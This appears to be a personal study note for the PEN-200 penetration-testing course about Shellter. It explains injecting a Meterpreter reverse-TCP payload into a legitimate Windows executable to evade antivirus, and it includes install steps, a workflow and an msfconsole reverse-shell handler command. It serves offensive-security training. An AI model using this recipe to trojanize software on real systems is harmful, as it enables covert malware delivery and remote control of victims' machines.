# Shellter

> **PEN-200 Chapter 12 — §12.3.3.** **Shellter** is a dynamic shellcode-injection / PE-infector tool used in the chapter to automate AV evasion by injecting a payload into a legitimate Windows executable.

## What Shellter does

At a high level Shellter:

```text
analyzes target PE + execution paths
        ↓
finds a suitable injection location
        ↓
uses existing PE structures / IAT entries where possible
        ↓
injects + obfuscates payload/decoder
        ↓
optionally restores normal program flow (Stealth Mode)
```

The chapter notes that Shellter tries to avoid obvious traditional modifications such as simply creating new PE sections or changing section permissions. It can use existing **Import Address Table (IAT)** entries to find functions needed for memory allocation, transfer, and execution.

## Install on Kali

```bash
apt-cache search shellter
sudo apt install shellter
```

Shellter is a Windows program, so PEN-200 runs it through Wine:

```bash
sudo apt install wine
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine32
```

Launch:

```bash
shellter
```

## Workflow

```text
shellter
   ↓
A = Auto mode
   ↓
select target 32-bit PE
   ↓
Shellter backs up original PE
   ↓
Enable Stealth Mode
   ↓
select listed or custom payload
   ↓
set LHOST + LPORT
   ↓
injection verification
   ↓
start matching listener/handler
   ↓
transfer modified PE to target
   ↓
scan + execute
```

### Auto vs Manual mode

- **Auto mode** — Shellter automatically chooses injection options; used in PEN-200.
- **Manual mode** — more granular control when automatic choices fail.

### Target PE choice

The chapter recommends choosing a **newer / less scrutinized legitimate application** during real engagements. Shellter creates a backup before modifying the original PE.

### Stealth Mode

Stealth Mode attempts to **restore the legitimate application's execution flow after the payload runs**, reducing obvious user-visible breakage.

For custom payloads to work correctly with Stealth Mode, the chapter notes that they need to terminate by **exiting the current thread**.

## PEN-200 Meterpreter handler example

The chapter's Shellter example uses a Meterpreter reverse TCP payload. Start the corresponding handler:

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT 443;run;"
```

Then transfer and execute the Shellter-modified PE on the target.

## Why the sample bypass works in the chapter

PEN-200 explains that Shellter **obfuscates both the payload and its decoder before injection**, so the tested Avira signature scan does not flag the modified executable. Executing the file still presents the legitimate application's normal UI while the injected payload connects back.

This is an example against the chapter's specific AV/environment, not a guarantee against other AV/EDR products.

## Quick decision rule

```text
Need AV bypass
   ↓
manual PowerShell/in-memory approach? → [[PowerShell Thread Injection]]
   ↓ no / prefer automated PE path
Shellter → legitimate PE → Stealth Mode → payload → handler → test
```

See also:

- [[AV Evasion Workflow]]
- [[AV Detection and Testing]]
- [[PowerShell Thread Injection]]

tag:#windows tag:#shellter tag:#av-evasion tag:#payload
